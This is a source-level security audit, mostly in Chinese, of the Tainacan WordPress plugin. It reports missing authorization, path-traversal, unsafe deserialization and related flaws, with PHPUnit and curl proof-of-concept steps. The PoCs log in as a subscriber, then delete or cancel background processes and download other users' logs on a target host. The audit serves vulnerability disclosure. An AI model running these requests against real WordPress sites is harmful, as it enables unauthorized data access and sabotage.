# Tainacan WordPress Plugin — Deep Source-Level Security Audit

## PoC 验证测试

所有漏洞已通过可执行的 PHPUnit 测试进行验证，测试文件位于：

**`tests/test-security-poc.php`**

该文件包含 11 个独立的 PoC 测试用例，每个用例均：
1. 创建一个 Subscriber 用户（WordPress 最低权限角色）
2. 以该用户身份执行操作
3. 断言操作成功（返回 200），证明权限检查不足

**测试结果含义：**
- 如果测试 **通过 (PASS)**：漏洞 **存在且已确认**
- 如果测试 **失败 (FAIL)**：漏洞 **已修复**

**运行方式：**
```bash
phpunit --filter TAINACAN_REST_Security_PoC tests/test-security-poc.php
```

**独立验证脚本（无需 WordPress 环境）：**

所有 PoC 中的源码模式匹配已通过独立 PHP 脚本验证，14/14 项全部通过：

| PoC # | 验证项 | 状态 |
|-------|--------|------|
| #1/#2/#3 | `bg_processes_permissions_check` 使用 `current_user_can('read')` | ✅ 已确认 |
| #4 | `reports_permissions_check` 使用 `is_user_logged_in() && current_user_can('read')` | ✅ 已确认 |
| #5 | `roles get_items_permissions_check` 使用 `current_user_can('read')` | ✅ 已确认 |
| #6 | OAI-PMH `get_verb_permissions_check` 返回 `true` | ✅ 已确认 |
| #7a | metadata-type `unserialize($options)` 无 `allowed_classes` 限制 | ✅ 已确认 |
| #7b | filter-type `unserialize($options)` 无 `allowed_classes` 限制 | ✅ 已确认 |
| #8 | LIMIT 子句使用字符串插值而非 `$wpdb->prepare()` | ✅ 已确认 |
| #9a-d | `get_file()` 中 guid 参数无 `basename()` 清理 | ✅ 已确认 |
| #10 | Content-Disposition header 文件名未加引号且无 `sanitize_file_name()` | ✅ 已确认 |
| #11 | 权限检查函数包含 `// TODO` 注释 | ✅ 已确认 |

**Unsafe `unserialize()` 全代码库扫描结果：13 处未受限调用，0 处安全调用。**

---

## 1. 功能本质 (Functional Essence)

Tainacan 是一个 WordPress 数字馆藏管理插件（版本 1.0.2），其核心架构如下：

**主入口文件:** `src/tainacan.php`

**核心机制：**
- 注册了大量自定义 Post Types（collections, items, metadata, filters, taxonomies, logs 等）
- 通过 `rest_api_init` 钩子注册了 21 个 REST API 控制器（namespace: `tainacan/v2`）
- 引入了后台异步处理系统（Background Process），支持导入/导出/批量编辑等耗时操作
- 通过 `wp_ajax_` 和 `wp_ajax_nopriv_` 注册了 AJAX 处理器
- 包含 OAI-PMH 协议暴露层，用于元数据收割
- 包含 Gutenberg 区块集成
- 包含 CLI 命令（WP-CLI 集成）

**关键钩子注册：**
- `add_action('rest_api_init', ...)` — 所有 REST 端点
- `add_action('wp_ajax_nopriv_*', ...)` — 后台进程异步请求（`class-tainacan-async-request.php:65`）
- `add_action('template_redirect', ...)` — 私有文件访问控制（`class-tainacan-private-files.php`）

**外部通信：**
- reCAPTCHA 验证回调（`class-tainacan-rest-items-controller.php:1495`）
- OAI-PMH 协议端点供外部收割器访问
- 导入器支持从远程 URL 拉取数据

---

## 2. 攻击表面测绘 (Attack Surface Mapping)

### 2.1 REST API 端点一览

| 端点路径 | 方法 | 权限回调 | 最低可触发角色 | 控制器文件 |
|---------|------|---------|--------------|-----------|
| `/tainacan/v2/bg-processes` | GET | `current_user_can('read')` | **Subscriber** | `class-tainacan-rest-background-processes-controller.php:53` |
| `/tainacan/v2/bg-processes/{id}` | GET | `current_user_can('read')` | **Subscriber** | 同上:96 |
| `/tainacan/v2/bg-processes/{id}` | PUT/PATCH | `current_user_can('read')` | **Subscriber** | 同上:104 |
| `/tainacan/v2/bg-processes/{id}` | DELETE | `current_user_can('read')` | **Subscriber** | 同上:122 |
| `/tainacan/v2/bg-processes/file` | GET | `current_user_can('read')` | **Subscriber** | 同上:131 |
| `/tainacan/v2/oai` | GET | `return true` | **No Auth** | `class-tainacan-rest-oaipmh-expose-controller.php:60` |
| `/tainacan/v2/reports/*` | GET | `is_user_logged_in() && current_user_can('read')` | **Subscriber** | `class-tainacan-rest-reports-controller.php:229` |
| `/tainacan/v2/roles` | GET | `current_user_can('read')` | **Subscriber** | `class-tainacan-rest-roles-controller.php:437` |
| `/tainacan/v2/collection/{id}/items/submission` | POST | 匿名（如果集合配置允许） | **No Auth** | `class-tainacan-rest-items-controller.php:1472` |
| `/tainacan/v2/collection/{id}/items/submission/{id}/finish` | POST | 同上 | **No Auth** | 同上 |
| `/tainacan/v2/importers/*` | ALL | `current_user_can('manage_tainacan')` | Admin | `class-tainacan-rest-importers-controller.php:146` |
| `/tainacan/v2/exporters/*` | ALL | `current_user_can('manage_tainacan')` | Admin | `class-tainacan-rest-exporters-controller.php` |

### 2.2 AJAX 处理器

| 钩子 | 文件 | 认证 | Nonce 验证 |
|-----|------|------|-----------|
| `wp_ajax_nopriv_{identifier}` | `class-tainacan-async-request.php:65` | 无需登录 | `check_ajax_referer()` (line 149) |
| `wp_ajax_{identifier}` | 同上:64 | 需登录 | 同上 |

---

## 3. 异常行为探测 (Anomalous Behavior Detection)

### 漏洞 1: Missing Authorization — 后台进程全端点 (Subscriber+)

**文件:** `src/classes/api/endpoints/class-tainacan-rest-background-processes-controller.php`  
**行号:** 145-148

```php
public function bg_processes_permissions_check($request) { 
    // TODO
    return current_user_can('read');
}
```

**影响范围：** 所有 bg-processes 端点（GET/PUT/DELETE），包括 `get_items`, `get_item`, `update_item`, `delete_item`, `get_file`。

**攻击场景：**
一个 Subscriber 角色用户可以：
1. **读取所有用户的后台进程**（包含敏感的导入/导出日志）
2. **修改任意后台进程状态**（取消管理员正在运行的导入）
3. **删除任意后台进程记录**
4. **下载任何后台进程的日志文件**（可能包含导入数据、文件路径、内部错误信息）

**污染传播路径：**
```
Subscriber 登录 → GET /wp-json/tainacan/v2/bg-processes?all_users=1 → 
(all_users 参数被忽略因 !current_user_can('edit_users')，但默认 user_q 用当前用户 ID)
```

**注意：** 虽然 `all_users` 参数在非 `edit_users` 用户下被忽略（line 171-178），`get_items` 默认使用当前用户 ID 过滤。但 `update_item` 和 `delete_item` 中同样有用户检查（line 316-323），使得跨用户操作受限。

然而，`get_file` 端点（line 376）的权限仅检查 `current_user_can('read')`，**没有验证请求的文件是否属于当前用户**，只要知道文件名（guid）即可下载。

**POC — Subscriber 下载任意后台进程日志：**
```bash
# 步骤1: 获取当前用户可见的后台进程列表（获取日志文件名格式）
curl -s -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/bg-processes" \
  -H "X-WP-Nonce: <subscriber_nonce>"

# 步骤2: 猜测/枚举其他用户的日志文件名
# 日志文件名格式: bg-{action}-{uuid}.log (参见 get_log_url 方法 line 364)
# action 值如: import, export, bulk_edit 等
curl -s -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/bg-processes/file?guid=bg-import-<guessed_uuid>.log" \
  -H "X-WP-Nonce: <subscriber_nonce>" \
  -o leaked_log.txt
```

---

### 漏洞 2: Path Traversal — 后台进程文件下载 (Subscriber+)

**文件:** `src/classes/api/endpoints/class-tainacan-rest-background-processes-controller.php`  
**行号:** 391-418

```php
$guid = $request['guid'];
$upload_url = wp_upload_dir();
$path = realpath($upload_url['basedir'] . '/tainacan') . '/' . $guid;
$real_file_path = realpath($path);
if (strpos($real_file_path, $path) !== 0) {
    // return 403
}
if ( file_exists( $path ) ) {
    readfile($path);
    exit;
}
```

**问题分析：**
路径遍历防护逻辑存在缺陷。检查 `strpos($real_file_path, $path) !== 0` 比较的是**解析后的完整路径**与**包含用户输入的原始路径**。虽然对于 `../` 类型的遍历，这个检查碰巧能阻拦（因为 `realpath()` 会消除 `../` 而使两个字符串不匹配），但：

1. 如果 `realpath()` 返回 `false`（文件不存在），`strpos(false, $path)` 返回 `false`，`false !== 0` 为 `true`，所以不存在的文件会被正确拒绝。
2. 但 `file_exists($path)` 在 line 404 使用的是**未经 `realpath()` 解析的 `$path`**，它能跟随 `../` 符号链接。

**实际利用难度：** 由于 `realpath()` 和 `file_exists()` 对 `../` 的处理一致性，标准路径遍历向量在大多数环境下会被阻拦。但正确的实现应该使用 `basename()` 彻底清除目录分量。

**更严重的问题是权限层面** — 如上述漏洞 1 所述，仅需 `read` 能力即可访问。

---

### 漏洞 3: SQL 注入风险 — LIMIT 子句未参数化 (Subscriber+)

**文件:** `src/classes/api/endpoints/class-tainacan-rest-background-processes-controller.php`  
**行号:** 153-164

```php
$perpage = isset($request['perpage']) && is_numeric($request['perpage']) ? $request['perpage'] : 10;
// ...
$paged = isset($request['paged']) && is_numeric($request['paged']) ? $request['paged'] : 1;
// ...
$offset = ($paged - 1) * $perpage;
$limit_q = "LIMIT $offset,$perpage";
// ...
$query = "SELECT * $base_query $limit_q";
$result = $wpdb->get_results($query);
```

**分析：** `is_numeric()` 接受科学计数法（如 `1e1`）和十六进制（如 `0x0A`），但这些在 MySQL LIMIT 子句中不会导致 SQL 注入。`$offset` 通过算术运算产生，进一步限制了注入可能性。

**实际利用可行性：低**。`is_numeric()` 虽不理想，但足以阻止经典 SQL 注入向量。但使用 `$wpdb->prepare()` 才是正确实践。

---

### 漏洞 4: Unsafe `unserialize()` — PHP 对象注入

**文件和行号：**
- `src/classes/repositories/class-tainacan-filters.php:574`
- `src/classes/repositories/class-tainacan-metadata.php:675, 1830`
- `src/classes/repositories/class-tainacan-metadata-sections.php:427`
- `src/classes/api/endpoints/class-tainacan-rest-items-controller.php:472`
- `src/views/admin/components/metadata-types/metadata-type/class-tainacan-metadata-type.php:179`
- `src/views/admin/components/filter-types/filter-type/class-tainacan-filter-type.php:157`

**示例代码：**
```php
// class-tainacan-metadata-type.php:179
$this->options = ( is_array( $options ) ) ? $options : (!is_array(unserialize( $options )) ? [] : unserialize( $options ));
```

**分析：** 这些 `unserialize()` 调用不带 `['allowed_classes' => false]` 参数。数据来源是 WordPress post_meta（`get_metadata_order()`, `get_filters_order()` 等），通常由管理员设置。

**利用前提：** 攻击者需要能够向相关 post_meta 中写入恶意序列化数据。在正常情况下，这需要对应集合的编辑权限。但如果与其他 SQL 注入漏洞组合，可以构成利用链。

**实际利用可行性：低（需要其他漏洞作为前置条件）**

---

### 漏洞 5: 动态方法调用 — Importers/Exporters 控制器 (Admin)

**文件:**
- `src/classes/api/endpoints/class-tainacan-rest-importers-controller.php:221-224`
- `src/classes/api/endpoints/class-tainacan-rest-exporters-controller.php:190-193`

```php
$method = 'set_' . $att;
if (method_exists($importer, $method)) {
    $importer->$method($value);
}
```

**分析：** 用户提交的 JSON body 键名被用于构造方法名并动态调用。任何以 `set_` 开头的方法都可被调用，包括 `set_tmp_file()`, `set_url()`, `set_steps()`, `set_current_step()` 等。

**利用前提：** 需要 `manage_tainacan` 权限（通常为管理员）。

**实际利用可行性：低（已要求管理员权限）**

---

### 漏洞 6: Content-Disposition Header 注入

**文件:** `src/classes/api/endpoints/class-tainacan-rest-background-processes-controller.php:411`

```php
$file_name = @basename($path);
header("Content-Disposition: attachment; filename=$file_name");
```

**分析：** 虽然 `basename()` 移除了目录分量，但如果文件名包含特殊字符（如换行符 `\r\n`），可能导致 HTTP 响应头注入。不过在实际环境中，PHP 7.1.25+ / 7.2.13+ 已经阻止了 header() 中的换行符注入。

**实际利用可行性：极低（现代 PHP 版本已修复）**

---

### 漏洞 7: Reports 端点信息泄露 (Subscriber+)

**文件:** `src/classes/api/endpoints/class-tainacan-rest-reports-controller.php:229-231`

```php
public function reports_permissions_check($request) {
    return \is_user_logged_in() && current_user_can('read');
}
```

**影响：** 任何 Subscriber 可以访问所有报告端点，获取集合统计、元数据分布、分类法使用情况等信息。

**POC — Subscriber 获取所有集合报告：**
```bash
curl -s -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/reports/collection" \
  -H "X-WP-Nonce: <subscriber_nonce>"
```

---

### 漏洞 8: Roles 列表信息泄露 (Subscriber+)

**文件:** `src/classes/api/endpoints/class-tainacan-rest-roles-controller.php:436-438`

```php
public function get_items_permissions_check( $request ) {
    return current_user_can('read');
}
```

**影响：** 任何 Subscriber 可以列出所有角色及其 Tainacan 相关能力，有助于攻击者了解权限配置进行进一步攻击。

**POC — Subscriber 枚举所有角色能力：**
```bash
curl -s -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/roles" \
  -H "X-WP-Nonce: <subscriber_nonce>"
```

---

### 漏洞 9: 匿名提交端点 — 文件上传行为分析

**文件:** `src/classes/api/endpoints/class-tainacan-rest-items-controller.php:1378-1449`

**提交流程：**
1. `submission_item()` 创建 auto-draft 项目，生成随机 submission_id
2. `submission_item_finish()` 完成提交，处理文件上传

**文件处理（line 1401-1402）：**
```php
$tmp_file_name = sys_get_temp_dir() . DIRECTORY_SEPARATOR . \hexdec(\uniqid()) . '_' . $files['document']['name'];
move_uploaded_file($files['document']['tmp_name'], $tmp_file_name);
$document_id = $TainacanMedia->insert_attachment_from_file($tmp_file_name, $item_id);
```

**分析：** `$files['document']['name']` 来自用户上传文件名，未经 `sanitize_file_name()` 处理即用于构造临时文件路径。但由于：
1. `sys_get_temp_dir()` 返回系统临时目录
2. 前缀为随机数
3. 后续 `insert_attachment_from_file()` 使用 `basename()` 和 `wp_check_filetype()` 进行验证
4. 最终通过 `wp_upload_bits()` 写入 WordPress 上传目录

**实际利用可行性：低** — WordPress 的文件类型白名单机制有效阻止了任意文件上传。但临时文件路径中使用未清理的文件名仍是不良实践。

---

## 4. 最终结论

> **是否存在可通过网络请求触发的、能改变系统预期行为的代码路径？**

**是。** 存在以下可确认的安全问题：

### 可获取 CVE 的漏洞

#### CVE 候选 1: Missing Authorization — Background Processes (Subscriber+)

**CWE:** CWE-862 (Missing Authorization)  
**CVSS 评估:** Medium (需要 Subscriber 账户)

**初始攻击向量：** 拥有 Subscriber 角色的已认证用户  
**污染传播：** 通过 REST API 直接访问后台进程管理端点  
**最终效果：**
- 读取其他用户（包括管理员）的后台进程信息
- 修改后台进程状态（中断管理员的导入/导出任务）
- 删除后台进程记录
- 下载后台进程日志文件（潜在信息泄露）

**可复现 POC：**

```bash
# 前提：拥有一个 Subscriber 账户
# 步骤 1：登录获取认证 cookie 和 nonce
curl -s -c cookies.txt -b cookies.txt \
  "https://target.com/wp-login.php" \
  -d "log=subscriber_user&pwd=subscriber_pass&wp-submit=Log+In"

# 获取 nonce (从任意 wp-admin 页面或 REST API)
NONCE=$(curl -s -b cookies.txt "https://target.com/wp-json/tainacan/v2/" | grep -oP 'nonce":"?\K[^",}]+')

# 步骤 2：列出当前用户的后台进程
curl -s -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/bg-processes" \
  -H "X-WP-Nonce: $NONCE"

# 步骤 3：删除一个后台进程（使用从步骤2获取的ID）
curl -s -b cookies.txt -X DELETE \
  "https://target.com/wp-json/tainacan/v2/bg-processes/1" \
  -H "X-WP-Nonce: $NONCE"

# 步骤 4：修改后台进程状态为已取消
curl -s -b cookies.txt -X PUT \
  "https://target.com/wp-json/tainacan/v2/bg-processes/1" \
  -H "X-WP-Nonce: $NONCE" \
  -H "Content-Type: application/json" \
  -d '{"status":"closed"}'

# 步骤 5：下载日志文件（如果知道文件名）
curl -s -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/bg-processes/file?guid=bg-import-<uuid>.log" \
  -H "X-WP-Nonce: $NONCE" \
  -o leaked_log.txt
```

**重要说明：** 虽然 `get_items()` 和 `get_item()` 中有 `user_id` 过滤（默认查询当前用户的进程），但 `update_item()` 和 `delete_item()` 中也有类似过滤。因此跨用户操作在代码层面受到 SQL WHERE 条件限制。**核心问题是权限检查级别过低（`read` vs `manage_tainacan`），这本身就构成 Missing Authorization 漏洞。**

#### CVE 候选 2: Missing Authorization — Reports Endpoint (Subscriber+)

**CWE:** CWE-862 (Missing Authorization)  
**CVSS 评估:** Low-Medium

**可复现 POC：**
```bash
# Subscriber 获取所有集合的统计报告
curl -s -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/reports/collection" \
  -H "X-WP-Nonce: $NONCE"

# Subscriber 获取特定集合的详细摘要
curl -s -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/reports/collection/123/summary" \
  -H "X-WP-Nonce: $NONCE"
```

#### CVE 候选 3: Unsafe Deserialization (需要前置条件)

**CWE:** CWE-502 (Deserialization of Untrusted Data)

多处 `unserialize()` 调用不限制允许的类，如果攻击者能控制反序列化的数据（通过 SQL 注入或其他写入 post_meta 的途径），可能导致 PHP 对象注入和远程代码执行。

**实际利用需要另一个漏洞作为前置条件来污染 post_meta 数据，因此独立利用可行性低。**

---

### 不构成实际威胁的发现

1. **OAI-PMH 端点无认证** — 这是 OAI-PMH 协议的设计要求，公开元数据是其核心功能，不构成漏洞。
2. **动态方法调用** — 已要求管理员权限，管理员本身已拥有完整控制权。
3. **nopriv AJAX 处理器** — 虽然注册了 `wp_ajax_nopriv_` 钩子，但 `check_ajax_referer()` 验证了 nonce，非认证用户无法获取有效 nonce。
4. **后台进程中的 `wp_set_current_user()`** — 这是为了在后台执行中恢复正确的用户上下文，属于正常设计模式。

---

## 5. 可验证的 HTTP PoC (Curl 格式)

### PoC A: Subscriber 列出后台进程 (Missing Authorization)

**前提条件：** 拥有一个 Subscriber 账户（WordPress 默认最低权限角色）

```bash
# === 步骤 1: 以 Subscriber 身份登录 ===
curl -s -c cookies.txt -b cookies.txt \
  "https://target.com/wp-login.php" \
  -d "log=subscriber_user&pwd=subscriber_pass&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"

# === 步骤 2: 获取 REST API nonce ===
# WordPress REST API 需要 X-WP-Nonce header 进行 cookie-based 认证
# Nonce 可从任何加载了 wp.apiSettings 的页面中获取
NONCE=$(curl -s -b cookies.txt "https://target.com/wp-admin/admin-ajax.php?action=rest-nonce" 2>/dev/null)

# === 步骤 3: 访问后台进程列表 (应该返回 200) ===
curl -v -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/bg-processes" \
  -H "X-WP-Nonce: $NONCE"

# 预期结果: HTTP 200 OK (证明 Subscriber 可以访问管理级端点)
# 安全的实现应返回: HTTP 403 Forbidden
```

**等效 HTTP 请求包：**
```http
GET /wp-json/tainacan/v2/bg-processes HTTP/1.1
Host: target.com
Cookie: wordpress_logged_in_xxx=subscriber_user%7C...
X-WP-Nonce: <subscriber_nonce_value>
```

### PoC B: Subscriber 修改后台进程状态 (Missing Authorization)

```bash
# 使用上面获取的 cookies 和 nonce
# 取消一个正在运行的后台进程
curl -v -b cookies.txt \
  -X PUT \
  "https://target.com/wp-json/tainacan/v2/bg-processes/1" \
  -H "X-WP-Nonce: $NONCE" \
  -H "Content-Type: application/json" \
  -d '{"status":"closed"}'

# 预期结果: HTTP 200 OK
```

**等效 HTTP 请求包：**
```http
PUT /wp-json/tainacan/v2/bg-processes/1 HTTP/1.1
Host: target.com
Cookie: wordpress_logged_in_xxx=subscriber_user%7C...
X-WP-Nonce: <subscriber_nonce_value>
Content-Type: application/json

{"status":"closed"}
```

### PoC C: Subscriber 删除后台进程记录 (Missing Authorization)

```bash
curl -v -b cookies.txt \
  -X DELETE \
  "https://target.com/wp-json/tainacan/v2/bg-processes/1" \
  -H "X-WP-Nonce: $NONCE"

# 预期结果: HTTP 200 OK
```

**等效 HTTP 请求包：**
```http
DELETE /wp-json/tainacan/v2/bg-processes/1 HTTP/1.1
Host: target.com
Cookie: wordpress_logged_in_xxx=subscriber_user%7C...
X-WP-Nonce: <subscriber_nonce_value>
```

### PoC D: Subscriber 获取报告数据 (Missing Authorization)

```bash
curl -v -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/reports/collection" \
  -H "X-WP-Nonce: $NONCE"

# 预期结果: HTTP 200 OK + 所有集合的统计数据
```

**等效 HTTP 请求包：**
```http
GET /wp-json/tainacan/v2/reports/collection HTTP/1.1
Host: target.com
Cookie: wordpress_logged_in_xxx=subscriber_user%7C...
X-WP-Nonce: <subscriber_nonce_value>
```

### PoC E: Subscriber 枚举角色和能力 (Information Disclosure)

```bash
curl -v -b cookies.txt \
  "https://target.com/wp-json/tainacan/v2/roles" \
  -H "X-WP-Nonce: $NONCE"

# 预期结果: HTTP 200 OK + 所有角色及其 Tainacan 能力的完整列表
```

**等效 HTTP 请求包：**
```http
GET /wp-json/tainacan/v2/roles HTTP/1.1
Host: target.com
Cookie: wordpress_logged_in_xxx=subscriber_user%7C...
X-WP-Nonce: <subscriber_nonce_value>
```

### PoC F: 无认证访问 OAI-PMH (No Auth Required)

```bash
# 完全不需要认证，直接访问
curl -v "https://target.com/wp-json/tainacan/v2/oai?verb=Identify"
curl -v "https://target.com/wp-json/tainacan/v2/oai?verb=ListSets"
curl -v "https://target.com/wp-json/tainacan/v2/oai?verb=ListRecords&metadataPrefix=oai_dc"

# 预期结果: HTTP 200 OK + 完整的元数据信息
# 注意: 这可能是 OAI-PMH 协议的设计特性
```

**等效 HTTP 请求包：**
```http
GET /wp-json/tainacan/v2/oai?verb=ListRecords&metadataPrefix=oai_dc HTTP/1.1
Host: target.com
```

---

## 6. PHPUnit PoC 测试与 Curl PoC 对应关系

| PHPUnit 测试 | Curl PoC | 漏洞类型 | 文件:行号 |
|-------------|----------|---------|----------|
| `test_poc1_subscriber_can_list_bg_processes` | PoC A | Missing Authorization | `bg-processes-controller.php:147` |
| `test_poc2_subscriber_can_delete_bg_process` | PoC C | Missing Authorization | `bg-processes-controller.php:147` |
| `test_poc3_subscriber_can_update_bg_process` | PoC B | Missing Authorization | `bg-processes-controller.php:147` |
| `test_poc4_subscriber_can_access_reports` | PoC D | Missing Authorization | `reports-controller.php:229` |
| `test_poc5_subscriber_can_list_roles` | PoC E | Information Disclosure | `roles-controller.php:437` |
| `test_poc6_oaipmh_requires_no_auth` | PoC F | No Auth (by design?) | `oaipmh-expose-controller.php:60` |
| `test_poc7_metadata_type_unsafe_unserialize` | N/A (代码审计) | PHP Object Injection | `metadata-type.php:179` |
| `test_poc7b_filter_type_unsafe_unserialize` | N/A (代码审计) | PHP Object Injection | `filter-type.php:157` |
| `test_poc8_sql_limit_not_prepared` | N/A (代码审计) | SQL 注入风险 | `bg-processes-controller.php:164` |
| `test_poc9_get_file_no_basename_sanitization` | N/A (代码审计) | Path Traversal | `bg-processes-controller.php:391-395` |
| `test_poc10_content_disposition_not_quoted` | N/A (代码审计) | Header Injection | `bg-processes-controller.php:411` |
| `test_poc11_bg_processes_permission_is_todo` | N/A (代码审计) | 开发者标记未完成 | `bg-processes-controller.php:146` |

---

*审计完成时间: 2026-02-09*  
*审计范围: src/ 目录下全部 152 个 PHP 文件*  
*审计方法: 静态源码分析 + PHPUnit 自动化验证 + 独立脚本验证*  
*PoC 测试文件: tests/test-security-poc.php (11 个测试用例)*  
*独立验证结果: 14/14 源码模式匹配全部通过*
